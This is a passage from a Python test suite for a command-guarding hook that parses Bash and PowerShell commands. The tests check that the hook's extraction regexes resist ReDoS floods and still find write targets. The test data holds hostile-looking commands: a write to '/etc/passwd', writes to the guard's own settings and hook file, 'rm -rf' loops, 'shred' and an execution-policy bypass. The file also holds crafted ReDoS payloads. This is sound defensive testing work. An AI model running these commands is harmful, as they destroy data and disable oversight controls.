        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"_candidate_paths_from_bash exceeded {_CI_SAFE_BUDGET_MS}ms on the {shape!r} perl "
            "prefix ReDoS payload — _PERL_OPEN_RE prefix went quadratic "
            "(TP-169 §13 #5 v2)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS


@pytest.mark.parametrize(
    "name,pattern,payload,expected_path",
    [
        ("py_open", _PY_FILE_OPEN_RE,
         "python -c \"open('/etc/passwd', 'w')\"", "/etc/passwd"),
        ("node_write", _NODE_FS_WRITE_RE,
         "node -e \"require('fs').writeFileSync('/tmp/x', 'd')\"", "/tmp/x"),
        ("ruby_write", _RUBY_FILE_WRITE_RE,
         "ruby -e \"File.write('/tmp/y', 'd')\"", "/tmp/y"),
        # The four legit perl write forms must still extract their path.
        ("perl_open_trunc", _PERL_OPEN_RE,
         "perl -e \"open(FH, '>tools/cc/hooks/write_guard.py')\"",
         "tools/cc/hooks/write_guard.py"),
        ("perl_open_append", _PERL_OPEN_RE,
         "perl -e \"open(FH, '>>.claude/settings.json')\"",
         ".claude/settings.json"),
        ("perl_open_readwrite", _PERL_OPEN_RE,
         "perl -e \"open(FH, '+>/tmp/z')\"", "/tmp/z"),
        ("perl_open_lead_space", _PERL_OPEN_RE,
         "perl -e \"open(FH, '> cc/PACK_MANIFEST.txt')\"",
         "cc/PACK_MANIFEST.txt"),
        # DEF-698: the pathlib writers and the destination-argument family.
        ("py_path_write_text", _PY_PATH_WRITE_RE,
         "Path('tools/cc/hooks/x.py').write_text('x')", "tools/cc/hooks/x.py"),
        ("py_path_open_w", _PY_PATH_WRITE_RE,
         "pathlib.Path('.claude/settings.json').open('w')", ".claude/settings.json"),
        ("py_dest_shutil_copy", _PY_DEST_ARG_WRITE_RE,
         "shutil.copy('/tmp/x', 'tools/cc/hooks/x.py')", "tools/cc/hooks/x.py"),
        ("py_dest_os_replace", _PY_DEST_ARG_WRITE_RE,
         "os.replace(\"/tmp/s\", \".claude/settings.json\")", ".claude/settings.json"),
    ],
)
def test_inner_write_target_regex_still_matches(name, pattern, payload, expected_path):
    """The ReDoS fix must not regress inner-regex extraction: the legit write
    forms still match and the captured path is unchanged.

    ``_PERL_OPEN_RE``'s path is group 2 (group 1 is the quote); the py/node/
    ruby regexes also carry the path in group 2.
    """
    m = pattern.search(payload)
    assert m is not None, f"{name} no longer matches legitimate payload: {payload!r}"
    assert m.group(2) == expected_path, (
        f"{name} extracted {m.group(2)!r}, expected {expected_path!r}"
    )


# ── Verb-anchored extraction regex ReDoS class (TP-169 §13 #5) ──────────────
#
# Six extraction regexes shaped ``\bVERB...<span>...<required token>`` are
# quadratic on a repeated verb (``sed sed sed...``): finditer retries the verb
# at every space-separated occurrence, each scanning an unbounded span toward an
# ABSENT required token -> O(verbs * remaining). Measured ~2.5s through the chain
# at the 32KB cap (the third C2 adversarial round). The fix bounds each span
# (``{0,512}`` chars / ``{0,64}`` tokens). These pins drive the REAL chain (the
# authoritative reachability) and assert the chain ceiling on a ~28KB repeated-verb payload.
# `_SED_INPLACE_RE` / `_GIT_CHECKOUT_DASHDASH_RE` are already imported from
# write_guard above; `_DD_OF_RE` / `_TAR_C_RE` / `_PS_PATH_FLAG_RE` are not
# re-exported, so pull them from _bash_patterns. (`_CP_MV_INSTALL_TARGET_DIR_RE`
# was here until 2026-09-05: the target-directory flag is read by
# `_target_directory_value` on the tokenizer now, a linear walk, not a regex.)
from _bash_patterns import (  # noqa: E402
    _BASH_COMMAND_CAP,
    _CHMOD_CHOWN_RE,
    _candidate_paths_from_bash,
    _candidate_paths_from_powershell,
    _DD_OF_RE,
    _POWERSHELL_DASH_COMMAND_RE,
    _PS_BASH_DASH_C_RE,
    _PS_DOTNET_FILE_RE,
    _PS_ITEM_PROPERTY_ASSIGN_RE,
    _ROLE_MAP_CAP,
    mask_inert_syntax,
    _PS_COPY_MOVE_DEST_RE,
    _PS_COPY_MOVE_POSITIONAL_RE,
    _PS_COPY_MOVE_SRC_FLAG_RE,
    _PS_HERE_STRING_RE,
    _PS_INTERP_STDIN_RE,
    _PS_NODE_DASH_E_RE,
    _PS_PATH_FLAG_RE,
    _PS_PERL_DASH_E_RE,
    _PS_PERMISSION_RE,
    _PS_PROGRAM_STRING_RE,
    _PS_PYTHON_DASH_C_RE,
    _PS_RUBY_DASH_E_RE,
    _TAR_C_RE,
)

# (name, repeated-verb token that never completes the required token)
_VERB_EXTRACTION_REGEXES = [
    ("sed_inplace", _SED_INPLACE_RE, "sed"),
    ("dd_of", _DD_OF_RE, "dd"),
    ("tar_c", _TAR_C_RE, "tar"),
    ("git_dashdash", _GIT_CHECKOUT_DASHDASH_RE, "git checkout x"),
    # DEF-638 matcher, registered the day it landed.
    ("chmod_chown", _CHMOD_CHOWN_RE, "chmod"),
    # DEF-712 lane: the Bash inline openers took a valued switch run; a flood
    # of valued switches that never reaches `-c`.
    ("python_dash_c_switches", _PYTHON_DASH_C_RE, "python -W ignore"),
    # DEF-832: the program operand is a shell WORD of adjacent segments; a
    # flood of quoted-then-bare segments, of double-quoted ones, of ANSI-C
    # ones, a flood of openers each carrying a short word, and a word that
    # never closes its last quote -- on the interpreter opener, the POSIX
    # shell opener and the PowerShell command opener
    ("python_dash_c_segments", _PYTHON_DASH_C_RE, "python -c 'a'b"),
    ("python_dash_c_dq_segments", _PYTHON_DASH_C_RE, "python -c \"a\"b"),
    ("python_dash_c_ansi_segments", _PYTHON_DASH_C_RE, "python -c $'a'b"),
    ("python_dash_c_segment_flood", _PYTHON_DASH_C_RE, "'a'b"),
    ("python_dash_c_unclosed_tail", _PYTHON_DASH_C_RE, "python -c 'a'\"b"),
    ("shell_dash_c_segments", _bash_patterns._SHELL_DASH_C_RE, "sh -c 'a'b"),
    ("shell_dash_c_segment_flood", _bash_patterns._SHELL_DASH_C_RE, "'a'b"),
    ("powershell_dash_command_segments", _POWERSHELL_DASH_COMMAND_RE, "pwsh -Command 'a'b"),
    ("powershell_dash_command_segment_flood", _POWERSHELL_DASH_COMMAND_RE, "'a'b"),
    # DEF-827: the scan rewrite that resolves a discovered command to the
    # verb it names, registered the day it landed -- a flood of discovered
    # heads (each a `_CMD_POS_NO_VERB` prefix run with a failing tail once the
    # verb repeats), of unclosed substitutions, and of the backtick form
    ("bash_discovered_head", _bash_patterns._BASH_DISCOVERED_HEAD_RE, "$(which find)"),
    ("bash_discovered_head_unclosed", _bash_patterns._BASH_DISCOVERED_HEAD_RE, "$(which"),
    ("bash_discovered_head_backtick", _bash_patterns._BASH_DISCOVERED_HEAD_RE, "`which find`"),
]

# PowerShell verb regexes: same isolated pin, but their CHAIN arm must drive
# `_candidate_paths_from_powershell` -- `ps_path_flag` sat in the bash list and
# its chain arm timed the bash entrypoint, which never reaches these (DEF-638
# failure-mode pass). Nothing else times the PowerShell extractor end to end.
_PS_VERB_EXTRACTION_REGEXES = [
    ("ps_path_flag", _PS_PATH_FLAG_RE, "Set-Content"),
    # `truncate` on the PowerShell tool (the write extractor's native arm)
    ("ps_truncate", _bash_patterns._PS_TRUNCATE_RE, "truncate"),
    ("ps_truncate_sizes", _bash_patterns._PS_TRUNCATE_RE, "truncate -s 0"),
    # DEF-814's sibling: the three git materialise arms on the PowerShell
    # head, the Bash tails composed once (the Bash arms are budgeted above)
    ("ps_git_dashdash", _bash_patterns._PS_GIT_CHECKOUT_DASHDASH_RE, "git checkout x"),
    ("ps_git_bare", _bash_patterns._PS_GIT_CHECKOUT_BARE_RE, "git checkout -x"),
    ("ps_git_restore", _bash_patterns._PS_GIT_RESTORE_RE, "git restore -x"),
    # DEF-827: the scan rewrite that resolves a call on a command object to
    # the verb it names -- a flood of objects, of unclosed sub-expressions,
    # and of the -Name switch with no verb behind it
    ("ps_command_object_head", _bash_patterns._PS_COMMAND_OBJECT_HEAD_RE, "& (gcm find)"),
    ("ps_command_object_unclosed", _bash_patterns._PS_COMMAND_OBJECT_HEAD_RE, "& (Get-Command"),
    ("ps_command_object_name_switch", _bash_patterns._PS_COMMAND_OBJECT_HEAD_RE, "& (gcm -Name"),
    ("ps_copy_move_dest", _PS_COPY_MOVE_DEST_RE, "Copy-Item"),
    ("ps_copy_move_positional", _PS_COPY_MOVE_POSITIONAL_RE, "Copy-Item -x"),
    ("ps_copy_move_src_flag", _PS_COPY_MOVE_SRC_FLAG_RE, "-Path"),
    # The per-match statement-segment slice in the -Destination leg is O(n)
    # per match: a repeated ";"-terminated destination is its worst case, and
    # `_cap_for_scan` is what keeps the product linear.
    ("ps_copy_move_dest_segments", _PS_COPY_MOVE_DEST_RE, "Copy-Item -Destination x;"),
    # DEF-697 matcher, registered the day it landed: both grammars, since the
    # per-verb operand walk (`_ps_permission_targets`) runs on each match.
    ("ps_permission_attrib", _PS_PERMISSION_RE, "attrib +R"),
    # DEF-717: the exec-quote arm's switch run may carry one bare value per
    # switch (a nested quantifier). This repeated-opener row is the cheap
    # shape; the WORST case -- one opener, a long run of values holding `-` or
    # `/` -- is `test_ps_switch_value_run_linear_on_dash_bearing_values` below.
    ("ps_exec_switch_value_run", _PS_PATH_FLAG_RE, "powershell -Verb RunAs"),
    ("ps_permission_set_acl", _PS_PERMISSION_RE, "Set-Acl -Path:"),
    # DEF-712: the interpreter arm, registered the day it landed -- each
    # opener on its repeated head, the exe-path prefix on a repeated quoted
    # path, the piped-stdin opener on a repeated pipe.
    ("ps_python_dash_c", _PS_PYTHON_DASH_C_RE, "python -c"),
    ("ps_node_dash_e", _PS_NODE_DASH_E_RE, "node -e"),
    ("ps_ruby_dash_e", _PS_RUBY_DASH_E_RE, "ruby -e"),
    ("ps_perl_dash_e", _PS_PERL_DASH_E_RE, "perl -e"),
    ("ps_exe_prefix_quoted", _PS_PYTHON_DASH_C_RE, "& 'C:\\a\\b\\python.exe' -c"),
    ("ps_exe_prefix_bare", _PS_PERMISSION_RE, "C:\\a\\b\\attrib.exe +R"),
    ("ps_interp_stdin", _PS_INTERP_STDIN_RE, "| python -"),
    ("ps_interp_stdin_switches", _PS_INTERP_STDIN_RE, "| pwsh -NoProfile -Command -;"),
    # DEF-3075: the opener's tail takes a redirect and a comment, and opens
    # on a call operator after the pipe; each on its repeated seed.
    ("ps_interp_stdin_redirect", _PS_INTERP_STDIN_RE, "| bash 2>&1 "),
    ("ps_interp_stdin_call_operator", _PS_INTERP_STDIN_RE, "| & bash "),
    ("ps_python_switch_values", _PS_PYTHON_DASH_C_RE, "python -W ignore"),
    # DEF-637 (§C49), registered the day they landed: the cross-shell openers
    # on their repeated heads and repeated switch runs, and the two coverage
    # matchers (DEF-730 / DEF-733) on a repeated head that never closes.
    ("ps_bash_dash_c", _PS_BASH_DASH_C_RE, "bash -c"),
    ("ps_bash_dash_c_switches", _PS_BASH_DASH_C_RE, "bash --norc -x"),
    # the clustered `-lc`: the switch run and the cluster arm overlap on it,
    # and the run gives it back one token at a time -- one pass (review)
    ("ps_bash_dash_lc_cluster", _PS_BASH_DASH_C_RE, "bash -lc"),
    ("ps_bash_cluster_flood", _PS_BASH_DASH_C_RE, "-lc"),
    ("ps_bash_plus_c_head", _PS_BASH_DASH_C_RE, "bash +c"),
    ("ps_bash_plus_lc_head", _PS_BASH_DASH_C_RE, "bash +lc"),
    ("ps_bash_exe_prefix", _PS_BASH_DASH_C_RE, "& 'C:\\a\\b\\bash.exe' -c"),
    ("ps_dotnet_file", _PS_DOTNET_FILE_RE, "[IO.File]::WriteAllText("),
    ("ps_item_property_assign", _PS_ITEM_PROPERTY_ASSIGN_RE, "(Get-Item x"),
    # A flood of re-parse openers whose switch VALUE is the next opener word
    # (`-Command powershell -Command powershell ...`): the shared switch run
    # read every following pair as switch-plus-value, O(n) at each of the n
    # command positions -- 24 s at 28 KB, one second at 6 KB, at HEAD before
    # DEF-637's witness row found it. The run is unbounded and a switch value
    # may not be an opener word (the receipt's remedy; a 64-token bound was
    # tried first and measured failing both ways); the DEF-717 dash-bearing rows could not see
    # this shape because their values were never opener words.
    ("ps_exec_switch_value_is_an_opener", _PS_PATH_FLAG_RE, "powershell -Command"),
]

# The Bash-tool shell opener's rows, in the BASH list: its chain arm drives
# `_candidate_paths_from_bash`, the entrypoint that runs it.
_VERB_EXTRACTION_REGEXES += [
    ("powershell_dash_command", _POWERSHELL_DASH_COMMAND_RE, "powershell -Command"),
    ("powershell_dash_command_switches", _POWERSHELL_DASH_COMMAND_RE, "pwsh -NoProfile -ExecutionPolicy Bypass"),
]

# §C52 (2026-09-14), registered the day they landed: the remove/relocate
# operand arms on both shells. Each on its repeated head (the isolated pin
# above), and below through the READER that runs it -- the zone check runs
# the readers beside the write extractor, so the write chain never reaches
# these arms.
_C52_BASH_ROWS = [
    ("destroy", _bash_patterns._DESTROY_RE, "rm"),
    ("destroy_quoted_verb", _bash_patterns._DESTROY_RE, '"rm"'),
    ("rename", _bash_patterns._RENAME_RE, "rename"),
    ("zip", _bash_patterns._ZIP_RE, "zip"),
    ("git_rm_mv", _bash_patterns._GIT_RM_MV_RE, "git rm"),
    ("tar_create", _bash_patterns._TAR_CREATE_RE, "tar"),
    ("find_delete", _bash_patterns._FIND_DELETE_RE, "find"),
    ("find_delete_predicates", _bash_patterns._FIND_DELETE_RE, "find x -name"),
    # DEF-826: the carrier pipeline -- a repeated head, a pipe flood, the
    # switch run on a repeated valued switch and on a bare-switch flood
    ("piped_remove", _bash_patterns._PIPED_REMOVE_RE, "find"),
    ("piped_remove_pipes", _bash_patterns._PIPED_REMOVE_RE, "find x |"),
    ("piped_remove_switches", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs -n 1"),
    ("piped_remove_switch_flood", _bash_patterns._PIPED_REMOVE_RE, "-0"),
    ("piped_remove_wrappers", _bash_patterns._PIPED_REMOVE_RE, "find . | sudo xargs sudo"),
    # DEF-831: the version-control listing head -- the head flooded before
    # the pipe, a repeated global-option run before the subcommand, and the
    # whole head repeated
    ("piped_remove_listing_pipes", _bash_patterns._PIPED_REMOVE_RE, "git ls-files |"),
    ("piped_remove_listing_preopts", _bash_patterns._PIPED_REMOVE_RE, "git -C . "),
    ("piped_remove_listing_quoted_preopts", _bash_patterns._PIPED_REMOVE_RE, 'git -C "a b" '),
    ("piped_remove_listing_open_quote", _bash_patterns._PIPED_REMOVE_RE, 'git -C "a b '),
    ("piped_remove_listing_heads", _bash_patterns._PIPED_REMOVE_RE, "git ls-files"),
    # DEF-830: the loop carrier -- a repeated head, a pipe flood, the read
    # builtin's switch run, a flood of body statements before the verb, a
    # flood of keywords; the for head on a substitution flood; the tail-fed
    # head on a flood of loop closers
    ("loop_remove", _bash_patterns._LOOP_REMOVE_RE, "find"),
    ("loop_remove_pipes", _bash_patterns._LOOP_REMOVE_RE, "find x |"),
    ("loop_remove_heads", _bash_patterns._LOOP_REMOVE_RE, "find . | while read"),
    ("loop_remove_read_switches", _bash_patterns._LOOP_REMOVE_RE, "find . | while read -r"),
    ("loop_remove_body_statements", _bash_patterns._LOOP_REMOVE_RE, "find . | while read f; do echo;"),
    ("loop_remove_keywords", _bash_patterns._LOOP_REMOVE_RE, "do "),
    ("for_subst_remove", _bash_patterns._FOR_SUBST_REMOVE_RE, "for f in $(find"),
    ("for_subst_remove_heads", _bash_patterns._FOR_SUBST_REMOVE_RE, "for f in $("),
    ("for_subst_remove_body_statements", _bash_patterns._FOR_SUBST_REMOVE_RE, "for f in $(find .); do echo;"),
    ("tail_loop_remove", _bash_patterns._TAIL_LOOP_REMOVE_RE, "while read f; do rm -rf $f; done < <(find"),
    ("tail_loop_remove_closers", _bash_patterns._TAIL_LOOP_REMOVE_RE, "done <"),
    ("tail_loop_remove_heads", _bash_patterns._TAIL_LOOP_REMOVE_RE, "while read"),
    # DEF-3028: the inner head's command-position run inside the
    # substitution (a wrapper flood, an open quoted directory), and the
    # native verb's quoted and escaped paths behind the carrier
    ("for_subst_remove_inner_wrappers", _bash_patterns._FOR_SUBST_REMOVE_RE, "for f in $(env "),
    ("for_subst_remove_inner_quoted_dir", _bash_patterns._FOR_SUBST_REMOVE_RE, 'for f in $("a b/'),
    ("tail_loop_remove_inner_wrappers", _bash_patterns._TAIL_LOOP_REMOVE_RE, "done < <(env "),
    ("piped_remove_quoted_verb_path", _bash_patterns._PIPED_REMOVE_RE, 'find . | xargs "a b/'),
    ("piped_remove_escaped_verb_path", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs a\\ "),
    # C76 (DEF-3031, DEF-3032): the carrier word's own prefix, and the
    # anchor's wrapper run with its flags behind each carrier
    ("piped_remove_spelled_carrier_word", _bash_patterns._PIPED_REMOVE_RE, "find . | ~/a/"),
    ("piped_remove_carrier_wrapper_flags", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs nice -n 19"),
    # (the flood behind an enumerator head, so it reaches the carrier run:
    # a bare `sudo -u x` flood only exercised the anchor, the code review)
    ("piped_remove_carrier_wrapper_flood", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs sudo -u x"),
    # the review's item 3: a wrapper's directory, an assignment run behind a
    # wrapper and before the carrier word, and bash's `|&`
    ("piped_remove_carrier_wrapper_dir", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs ~/a/env"),
    ("piped_remove_carrier_lead_dir", _bash_patterns._PIPED_REMOVE_RE, "find . | /a/b/"),
    ("piped_remove_carrier_lead_assign", _bash_patterns._PIPED_REMOVE_RE, "find . |& A=1"),
    ("piped_remove_carrier_env_assign", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs env A='x"),
    # a wrapper behind its directory, also a candidate flag argument of the
    # flag before it: the carrier's flag lookahead declines it, or the run
    # held write_guard past 15 s on 1.4 KB (C76's second failure-mode review;
    # the bare `-exec /a/env` flood is pinned at the regex alone in
    # test_carrier_directory_wrapper_flood_is_linear_at_the_regex)
    ("find_delete_action_wrapper_flag_dir", _bash_patterns._FIND_DELETE_ACTION_RE, "-exec nice -n /a/env"),
    ("piped_remove_carrier_dir_flag", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs /a/env -x"),
    ("piped_remove_carrier_backslash_dir", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs C:\\a\\env -x"),
    ("piped_carrier_witness_dir_wrapper", _bash_patterns._PIPED_CARRIER_WITNESS_RE, "| /a/env"),
    ("piped_remove_carrier_flag_dir", _bash_patterns._PIPED_REMOVE_RE, "find . | xargs env -u /a/env"),
    ("piped_carrier_witness_short_name", _bash_patterns._PIPED_CARRIER_WITNESS_RE, "| C:\\A~1\\"),
    ("find_delete_action_wrapper_flags", _bash_patterns._FIND_DELETE_ACTION_RE, "-exec sudo -u x"),
    ("piped_carrier_witness_wrappers", _bash_patterns._PIPED_CARRIER_WITNESS_RE, "| nice -n 19"),
    ("piped_carrier_witness_prefix", _bash_patterns._PIPED_CARRIER_WITNESS_RE, "| ~/a/"),
    ("loop_remove_body_assignments", _bash_patterns._LOOP_REMOVE_RE, "find . | while read f; do A=1"),
    ("for_subst_remove_body_wrappers", _bash_patterns._FOR_SUBST_REMOVE_RE, "for f in $(find .); do env -i"),
    # DEF-837: the word-list head -- a repeated head (the later ones read as
    # WORDS behind the first, so the word run floods), a flood of heads each
    # on its own command position, an open double quote (the quoted-word
    # arm), a flood of body statements before the verb
    ("for_words_remove", _bash_patterns._FOR_WORDS_REMOVE_RE, "for f in"),
    ("for_words_remove_heads", _bash_patterns._FOR_WORDS_REMOVE_RE, "for f in x;"),
    ("for_words_remove_open_quote", _bash_patterns._FOR_WORDS_REMOVE_RE, 'for f in "a'),
    ("for_words_remove_escapes", _bash_patterns._FOR_WORDS_REMOVE_RE, "for f in \\x"),
    ("for_words_remove_body_statements", _bash_patterns._FOR_WORDS_REMOVE_RE, "for f in *; do echo;"),
    ("dd_if", _bash_patterns._DD_IF_RE, "dd"),
    # the Bash-tool shell opener: repeated heads, a switch run, the `-lc`
    # cluster the run and the cluster arm overlap on, and a bare cluster flood
    ("shell_dash_c", _bash_patterns._SHELL_DASH_C_RE, "sh -c"),
    ("shell_dash_c_switches", _bash_patterns._SHELL_DASH_C_RE, "bash --norc -x"),
    ("shell_dash_lc_cluster", _bash_patterns._SHELL_DASH_C_RE, "bash -lc"),
    ("shell_cluster_flood", _bash_patterns._SHELL_DASH_C_RE, "-lc"),
    # DEF-3074: the cluster on the `+` sign, which the run's `+` switch also
    # reads, on its repeated head (a flood behind ONE head is the switch-run
    # rows' `plus-c-clusters-then-open-program`)
    ("shell_plus_c_head", _bash_patterns._SHELL_DASH_C_RE, "bash +c"),
    ("shell_plus_lc_head", _bash_patterns._SHELL_DASH_C_RE, "bash +lc"),
    # the review batch: a long option in the run, `c` first in the cluster,
    # and the git clean arm on its repeated head
    ("shell_dash_c_long_option", _bash_patterns._SHELL_DASH_C_RE, "bash --norc"),
    ("shell_dash_c_long_option_valued", _bash_patterns._SHELL_DASH_C_RE, "bash --rcfile x"),
    ("shell_dash_cx_cluster", _bash_patterns._SHELL_DASH_C_RE, "bash -cx"),
    ("git_clean", _bash_patterns._GIT_CLEAN_RE, "git clean"),
    # the here-string opener shares the switch run: its first unbounded form
    # read a shell head word as a switch value and was quadratic on a repeated
    # head (4.0 s at 28 KB through the write extractor, witnessed by the row
    # above the day the `-c` opener landed beside it). A switch's value may
    # not be any spelling of a shell head, which keeps the run linear with no
    # bound (DEF-818 took the bound away); these rows red if a value takes the
    # bare head word again, the spellings with a directory, an `.exe` or
    # another case are `test_posix_shell_switch_value_is_never_a_head_spelling`,
    # and the one-head switch-run floods are
    # `test_posix_shell_switch_run_linear_on_one_head`
    ("shell_herestring_repeated_head", _bash_patterns._SHELL_HERESTRING_RE, "sh -c"),
    ("shell_herestring_switches", _bash_patterns._SHELL_HERESTRING_RE, "bash --norc -x"),
    ("shell_herestring_opener", _bash_patterns._SHELL_HERESTRING_RE, "bash <<<"),
]
_C52_PS_ROWS = [
    ("ps_rename", _bash_patterns._PS_RENAME_RE, "Rename-Item"),
    ("ps_piped_remove", _bash_patterns._PS_PIPED_REMOVE_RE, "Get-ChildItem"),
    ("ps_piped_remove_pipes", _bash_patterns._PS_PIPED_REMOVE_RE, "gci x |"),
    ("ps_piped_remove_carrier", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | xargs -n 1"),
    ("ps_piped_remove_carrier_flood", _bash_patterns._PS_PIPED_REMOVE_RE, "-0"),
    ("ps_piped_remove_listing", _bash_patterns._PS_PIPED_REMOVE_RE, "git -C . ls-files |"),
    ("ps_piped_remove_listing_heads", _bash_patterns._PS_PIPED_REMOVE_RE, "git ls-files"),
    # DEF-3028's sibling: this tool's native verb path behind the carrier,
    # its separator flood
    ("ps_piped_remove_backslash_verb_path", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | xargs a\\"),
    # C76: the carrier word behind the call operator and a path, and the
    # wrapper run with its flags behind it
    ("ps_piped_remove_spelled_carrier_word", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | & 'a/"),
    ("ps_piped_remove_carrier_wrapper_flags", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | xargs sudo -u x"),
    # the bare call operator before the carrier word, and the lead run
    ("ps_piped_remove_bare_call_operator", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | &"),
    ("ps_piped_remove_carrier_lead_dir", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | /a/env"),
    ("ps_piped_remove_carrier_env_assign", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | xargs env A=1"),
    ("ps_piped_remove_carrier_dir_flag", _bash_patterns._PS_PIPED_REMOVE_RE, "gci . | xargs /a/env -x"),
    ("ps_git_rm_mv", _bash_patterns._PS_GIT_RM_MV_RE, "git rm"),
    ("ps_compress_archive", _bash_patterns._PS_COMPRESS_ARCHIVE_RE, "Compress-Archive"),
    # the find family on the PowerShell tool (DEF-824): the head with its
    # wrapper run and exe prefix, and the predicate-flood shape
    ("ps_find_delete", _bash_patterns._PS_FIND_DELETE_RE, "find"),
    ("ps_find_delete_wrapped", _bash_patterns._PS_FIND_DELETE_RE, "sudo find"),
    ("ps_find_delete_predicates", _bash_patterns._PS_FIND_DELETE_RE, "find . -name x"),
    # the native single-file deletes and git clean on the PowerShell tool
    ("ps_native_destroy", _bash_patterns._PS_NATIVE_DESTROY_RE, "unlink"),
    ("ps_native_destroy_wrapped", _bash_patterns._PS_NATIVE_DESTROY_RE, "sudo shred -u"),
    ("ps_git_clean", _bash_patterns._PS_GIT_CLEAN_RE, "git clean"),
]
_VERB_EXTRACTION_REGEXES += _C52_BASH_ROWS
_PS_VERB_EXTRACTION_REGEXES += _C52_PS_ROWS
_INNER_WRITE_TARGET_REGEXES += [
    # the inner MUTATION and READ tables (§C52): the same unclosed-quote
    # prefix shape as the write rows above
    ("py_os_mutate", _bash_patterns._PY_OS_MUTATE_RE, "os.remove('"),
    ("py_path_mutate", _bash_patterns._PY_PATH_MUTATE_RE, "Path('"),
    ("node_mutate", _bash_patterns._NODE_FS_MUTATE_RE, "unlinkSync('"),
    ("ruby_mutate", _bash_patterns._RUBY_FILE_MUTATE_RE, "File.delete('"),
    ("perl_mutate", _bash_patterns._PERL_MUTATE_RE, "unlink '"),
    ("py_open_read", _bash_patterns._PY_FILE_OPEN_READ_RE, "open('"),
    ("py_path_read", _bash_patterns._PY_PATH_READ_RE, "Path('"),
    ("node_read", _bash_patterns._NODE_FS_READ_RE, "readFileSync('"),
    ("ruby_read", _bash_patterns._RUBY_FILE_READ_RE, "File.read('"),
    ("perl_open_read", _bash_patterns._PERL_OPEN_READ_RE, "open(F, '<"),
]


@pytest.mark.parametrize("tool,name,verb", (
    [("Bash", n, v) for n, _p, v in _C52_BASH_ROWS]
    + [("PowerShell", n, v) for n, _p, v in _C52_PS_ROWS]
))
def test_mutation_reader_linear_through_chain(tool, name, verb):
    """End-to-end for the remove/relocate readers (§C52): a ~28KB repeated-verb
    command stays inside the chain ceiling through `iter_removed_or_relocated_operands` /
    `iter_ps_removed_or_relocated_operands` -- the entry points the zone and
    secret checks run, with the mask, the cap, the per-match span readers and
    the nested-program recursion."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    reader = (
        _bash_patterns.iter_removed_or_relocated_operands if tool == "Bash"
        else _bash_patterns.iter_ps_removed_or_relocated_operands
    )
    command = (verb + " ") * (28000 // (len(verb) + 1))
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        reader(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"the {tool} remove/relocate reader exceeded {_CHAIN_CEILING_MS}ms on a repeated {verb!r} "
            f"command -- verb-regex ReDoS class ({name}) regressed"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS


@pytest.mark.parametrize("label,payload", [
    # DEF-637: the Bash-tool shell opener's three program arms, unclosed --
    # a single-quoted body of anything but a quote, a double-quoted body of
    # backslashes (every one an escape), the mixed run, and a bare program
    # that never meets a separator -- and a FLOOD of openers through the
    # whole Bash extractor, which is what the hook runs.
    ("sq_unclosed", "pwsh -c '" + "x" * _WORST_CASE_BODY_LEN),
    ("dq_backslash_run", 'pwsh -c "' + "\\" * _WORST_CASE_BODY_LEN),
    ("dq_mixed_run", 'pwsh -c "' + '\\"a\\\\' * (_WORST_CASE_BODY_LEN // 5)),
    ("ansi_backslash_run", "pwsh -c $'" + "\\" * _WORST_CASE_BODY_LEN),
    ("ansi_escaped_quote_run", "pwsh -c $'" + "\\'" * (_WORST_CASE_BODY_LEN // 2)),
    ("bare_unbounded", "powershell -Command " + "x " * (_WORST_CASE_BODY_LEN // 2)),
    ("switch_run_flood", "powershell " + "-Command x " * (_WORST_CASE_BODY_LEN // 11)),
    # an UNBOUNDED switch run that never reaches a program, then the switchless
    # positional form as a flood of openers
    ("switch_run_no_program", "pwsh " + "-NoLogo " * (_WORST_CASE_BODY_LEN // 8)),
    ("slash_switch_run_no_program", "powershell " + "/NoLogo " * (_WORST_CASE_BODY_LEN // 8)),
    ("positional_flood", "powershell 'x'; " * (_WORST_CASE_BODY_LEN // 16)),
    ("opener_flood", "pwsh -c 'x'; " * (_WORST_CASE_BODY_LEN // 13)),
    ("route_flood", "pwsh -c 'bash -c \"pwsh -c x\"'; " * (_WORST_CASE_BODY_LEN // 30)),
])
def test_shell_opener_linear_on_unclosed_runs(label, payload):
    """The cross-shell opener's arms are mutually exclusive (`[^']` closed by
    the quote; `\\\\.` vs `[^\\\\"]`; a bounded bare class), so an unclosed
    program costs one pass, and the routing is depth-bounded so a flood of
    nested openers costs a bounded number of extractor runs."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _POWERSHELL_DASH_COMMAND_RE.findall(payload)
        _candidate_paths_from_bash(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"{label}: the shell opener exceeded {_CHAIN_CEILING_MS}ms")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS, f"{label}: {elapsed_ms:.1f}ms"


@pytest.mark.parametrize("pattern,payload", [
    (_POWERSHELL_DASH_COMMAND_RE, 'powershell -Command "Set-Content -Path x -Value 1"'),
    (_POWERSHELL_DASH_COMMAND_RE, "pwsh -NoProfile -c 'Get-Date'"),
    (_POWERSHELL_DASH_COMMAND_RE, "powershell -Command Get-Date"),
